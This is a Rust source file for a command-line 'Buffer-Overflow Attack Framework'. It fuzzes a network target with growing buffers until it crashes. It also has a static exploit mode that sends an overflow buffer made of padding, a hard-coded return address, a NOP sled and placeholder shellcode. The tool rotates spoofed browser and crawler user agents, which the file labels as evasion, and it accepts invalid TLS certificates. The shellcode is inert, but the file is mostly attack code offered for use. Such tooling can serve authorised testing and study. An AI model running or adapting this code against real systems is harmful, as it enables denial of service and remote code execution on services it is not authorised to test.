use clap::{Parser, ValueEnum, CommandFactory};
use native_tls::TlsConnector;
use std::io::Write;
use std::net::{TcpStream, ToSocketAddrs};
use std::time::{Duration, SystemTime, UNIX_EPOCH};

#[derive(ValueEnum, Clone, Copy, Debug, PartialEq)]
enum ProtocolMode {
    Raw,
    Http,
}

#[derive(Parser, Debug)]
#[command(name = "boaf")]
#[command(author = "Biswadeb Mukherjee <official-biswadeb941.in>")]
#[command(version = "2.0.0")]
#[command(about = "High-Performance Network Fuzzer & Buffer-Overflow Attack Framework", long_about = None)]
#[command(disable_help_flag = true)]
struct Args {
    /// Target destination string (e.g., https://192.168.1.50, http://example.com, or raw IP/domain)
    #[arg(short, long)]
    target: Option<String>,

    /// Execution strategy: 'raw' for raw binary streaming, 'http' for structured POST requests
    #[arg(short, long, value_enum, default_value_t = ProtocolMode::Raw)]
    mode: ProtocolMode,

    /// Execute in progressive Fuzzing mode to find crash boundaries
    #[arg(short, long)]
    fuzz: bool,

    /// Initial payload character footprint size for starting the fuzzer loop
    #[arg(long, default_value_t = 100)]
    start_size: usize,

    /// Maximum ceiling length limit for the testing buffer cycle
    #[arg(long, default_value_t = 5000)]
    max_size: usize,

    /// Interval increment value added to the packet during each iteration loop
    #[arg(long, default_value_t = 100)]
    step: usize,

    /// Trust local invalid/self-signed certificates found during network handshakes
    #[arg(long, default_value_t = true)]
    allow_self_signed: bool,

    /// Print help information
    #[arg(short, long, action = clap::ArgAction::SetTrue)]
    help: bool,
}

fn main() -> Result<(), Box<dyn std::error::Error>> {
    // 1. Attempt to parse arguments safely
    let args = Args::parse();

    // 2. Intercept Help Operations
    if args.help || args.target.is_none() {
        print_banner();
        let mut cmd = Args::command();
        cmd.print_help()?;
        println!();
        std::process::exit(0);
    }

    // 3. Display Custom Tool Signature Banner for normal runs
    print_banner();

    // Safely extract the required target argument since we verified it isn't None above
    let target_input = args.target.unwrap();

    // 4. Resolve host and establish fallback port protocols
    let (target_host, target_port) = parse_target_and_port(&target_input);
    let connection_string = format!("{}:{}", target_host, target_port);

    println!("[*] Evaluation Target Endpoint: {}", connection_string);
    println!("[*] Structural Encapsulation Mode: {:?}", args.mode);

    let socket_addrs: Vec<_> = connection_string.to_socket_addrs()?.collect();
    if socket_addrs.is_empty() {
        return Err("Fatal: Unable to map endpoint destination to a network IP.".into());
    }

    // 5. Branch Processing: Core Fuzzer Logic vs Exploit Injection
    if args.fuzz {
        println!("[*] Initializing network fuzzing engine loop...");
        let mut current_length = args.start_size;

        while current_length <= args.max_size {
            println!("[...] Testing stability limit footprint: {} bytes", current_length);

            let experimental_buffer = vec![b'A'; current_length];
            // The packet builder now draws a fresh, random user agent string for each round
            let constructed_packet = assemble_packet(&experimental_buffer, args.mode, &target_host);

            match connect_and_transmit(
                &socket_addrs,
                &target_host,
                target_port,
                &constructed_packet,
                args.allow_self_signed
            ) {
                Ok(_) => {
                    current_length += args.step;
                    std::thread::sleep(Duration::from_millis(300));
                }
                Err(e) => {
                    println!("\n[!] CRASH DETECTED OR CONNECTION TERMINATED AT TARGET");
                    println!("[!] Last transmission length sent: {} bytes", current_length);
                    println!("[!] Reason reported by network interface layer: {}", e);
                    break;
                }
            }
        }
    } else {
        println!("[*] Running standard static exploit injector profile...");

        let offset_length = 146;
        let nop_sled = vec![0x90; 16];
        let target_return_address = vec![0xAF, 0x12, 0x50, 0x62];
        let shellcode: Vec<u8> = vec![0x90, 0x90, 0xcc];

        let mut overflow_buffer = Vec::new();
        overflow_buffer.extend(vec![b'A'; offset_length]);
        overflow_buffer.extend(target_return_address);
        overflow_buffer.extend(nop_sled);
        overflow_buffer.extend(shellcode);

        let final_packet = assemble_packet(&overflow_buffer, args.mode, &target_host);

        connect_and_transmit(
            &socket_addrs,
            &target_host,
            target_port,
            &final_packet,
            args.allow_self_signed
        )?;
        println!("[+] Static instruction set sent successfully.");
    }

    Ok(())
}

/// Prints a stylized ASCII banner and professional signature to the console interface
fn print_banner() {
    let banner = r#"
========================================================================
    ██████╗  ██████╗  █████╗ ███████╗
    ██╔══██╗██╔═══██╗██╔══██╗██╔════╝
    ██████╔╝██║   ██║███████║█████╗
    ██╔══██╗██║   ██║██╔══██║██╔══╝
    ██████╔╝╚██████╔╝██║  ██║██║
    ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝

  [ Buffer-Overflow Attack Framework ]

  Made by: Biswadeb Mukherjee
  Role:    Security Engineer & Researcher
  Web:     official-biswadeb941.in
========================================================================
"#;
    println!("{}", banner);
}

/// Returns a pseudo-random modern browser client signature string based on system clock cycle
/// Returns a pseudo-random browser or client signature string based on system clock cycle
fn get_random_user_agent() -> &'static str {
    let user_agents = [
        // --- Windows Browsers ---
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Edge/122.0.0.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
        "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",

        // --- macOS / iOS Browsers ---
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.4; rv:124.0) Gecko/20100101 Firefox/124.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPad; CPU OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",

        // --- Linux / Android Browsers ---
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0",
        "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",

        // --- Search Engine Crawlers (Common Evasion/Spoofing Targets) ---
        "Mozilla/5.0 (compatible; Googlebot/2.1; +http://google.com)",
        "Mozilla/5.0 (compatible; Bingbot/2.0; +http://bing.com)",
        "Mozilla/5.0 (compatible; Yahoo! Slurp; http://yahoo.com)",
        "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://baidu.com)",
        "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com)",

        // --- API Clients & Dev Frameworks ---
        "PostmanRuntime/7.36.3",
        "curl/8.5.0",
        "Wget/1.21.4",
        "python-requests/2.31.0",
        "Go-http-client/1.1"
    ];

    // High-speed clock calculation to select an index entry dynamically without external dependencies
    let nanos = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap_or_else(|_| Duration::new(0, 0))
        .subsec_nanos();

    let index = (nanos as usize) % user_agents.len();
    user_agents[index]
}

fn assemble_packet(buffer: &[u8], mode: ProtocolMode, host: &str) -> Vec<u8> {
    let mut packet = Vec::new();
    match mode {
        ProtocolMode::Raw => {
            packet.extend_from_slice(buffer);
            packet.extend_from_slice(b"\n");
        }
        ProtocolMode::Http => {
            let dynamic_ua = get_random_user_agent();
            let http_header = format!(
                "POST / HTTP/1.1\r\n\
                 Host: {}\r\n\
                 User-Agent: {}\r\n\
                 Content-Type: application/x-www-form-urlencoded\r\n\
                 Content-Length: {}\r\n\
                 Connection: close\r\n\r\n\
                 data=",
                host,
                dynamic_ua,
                buffer.len() + 5
            );
            packet.extend_from_slice(http_header.as_bytes());
            packet.extend_from_slice(buffer);
        }
    }
    packet
}

fn connect_and_transmit(
    socket_addrs: &[std::net::SocketAddr],
    host: &str,
    port: u16,
    data: &[u8],
    allow_self_signed: bool,
) -> Result<(), Box<dyn std::error::Error>> {
    let target_addr = socket_addrs.first().ok_or("No valid IP addresses resolved.")?;
    let stream = TcpStream::connect_timeout(target_addr, Duration::from_secs(3))?;

    if port == 443 {
        let mut builder = TlsConnector::builder();
        if allow_self_signed {
            builder.danger_accept_invalid_certs(true);
            builder.danger_accept_invalid_hostnames(true);
        }
        let connector = builder.build()?;
        let mut tls_stream = connector.connect(host, stream)?;
        tls_stream.write_all(data)?;
        tls_stream.flush()?;
    } else {
        let mut raw_stream = stream;
        raw_stream.write_all(data)?;
        raw_stream.flush()?;
    }
    Ok(())
}

fn parse_target_and_port(input: &str) -> (String, u16) {
    let trimmed = input.trim();
    let default_port = if trimmed.starts_with("https://") { 443 } else { 80 };

    let mut sanitized = trimmed
        .trim_start_matches("https://")
        .trim_start_matches("http://")
        .to_string();

    if let Some(slash_idx) = sanitized.find('/') {
        sanitized.truncate(slash_idx);
    }

    if let Some(colon_idx) = sanitized.rfind(':') {
        let host = sanitized[..colon_idx].to_string();
        let port_str = &sanitized[colon_idx + 1..];

        if let Ok(custom_port) = port_str.parse::<u16>() {
            return (host, custom_port);
        }
    }

    (sanitized, default_port)
}
